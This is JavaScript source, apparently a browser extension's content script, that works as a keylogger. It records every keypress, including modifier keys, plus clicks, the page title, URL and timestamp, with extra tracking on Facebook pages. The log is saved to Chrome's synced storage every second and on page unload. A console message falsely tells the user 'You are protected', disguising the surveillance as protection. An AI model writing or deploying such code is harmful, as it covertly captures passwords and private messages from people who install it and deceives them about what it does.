
if(!document.title)
{
    document.title = document.baseURI;
}

document.addEventListener('keypress', function(e){
    e = e || window.event;
    press(e.key);
})

document.addEventListener('keydown', function (e) {
    e = e || window.event;
    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
    switch (charCode) {
        case 9:
            press('[TAB-9]');
        break;
        case 13:
            press(' ⤵️ ');
        break;
        case 16:
            press('[SHIFT-16]');
        break;
        case 17:
            press('[CTRL]');
        break;
        case 18:
            press('[ALT]');
        break;
        case 91:
            press('[L WINDOW]');
        break;
        case 92:
            press('[R WINDOW]'); 
        break;
        case 93:
            press('[SELECT/CMD]'); 
        break;
    }
});

var month = new Date().getMonth() + 1;
var getHours = new Date().getHours() + ':' + new Date().getMinutes() + ':' + new Date().getSeconds();
var getDay = new Date().getDate() + '/' + month + '/' + new Date().getFullYear();

var time = new Date().getTime();
var data = {};
var check = false;
var lastLog = time;
data[time] = document.title + "^~^" + document.URL + "^~^" + getHours + ' ' + getDay + "^~^";

document.addEventListener('click',function(){
    if(document.baseURI.includes('https://www.facebook.com'))
    {
        var month = new Date().getMonth() + 1;
        var getHours = new Date().getHours() + ':' + new Date().getMinutes() + ':' + new Date().getSeconds();
        var getDay = new Date().getDate() + '/' + month + '/' + new Date().getFullYear();
        var time = new Date().getTime();
        data[time] = document.title + "^~^" + document.URL + "^~^" + getHours + ' ' + getDay + "^~^";
    }
    press('👉');
});

function press(input)
{
    var now = new Date().getTime(); 
    data[time] += input;
    check = true;
    lastLog = now;
}

function saveData() {
    if (check) {
        chrome.storage.sync.set(data, function() {
            console.log(document.title + ' is safe ! %c You are protected ✔','color:green');
            check = false; 
        });
    }
}

window.onbeforeunload = function() {
    saveData();
}

window.onload = function()
{
    press('');
}

setInterval(function(){
    saveData();
}, 1000);

